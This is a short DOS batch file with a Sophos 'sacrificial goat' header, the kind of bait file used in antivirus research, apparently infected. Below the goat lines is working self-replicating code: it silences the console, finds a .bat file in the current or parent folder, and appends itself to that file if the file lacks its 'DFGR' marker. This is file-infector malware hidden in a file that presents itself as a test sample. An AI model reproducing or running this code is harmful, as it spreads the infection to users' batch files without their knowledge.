@REM ------- BEGIN OF SOPHOS GOAT ------
@ECHO Sophos Ltd, Oxford sacrificial BAT goat 300 bytes long
@REM ***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***
@REM ***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS***
@REM ------- END OF SOPHOS GOAT -------
Y
@ctty nul
for %%q in (*.bat ..\*.bat) do set DFGR=%%q
find "DFGR" %DFGR%
if errorlevel 1 type %0>>%DFGR%
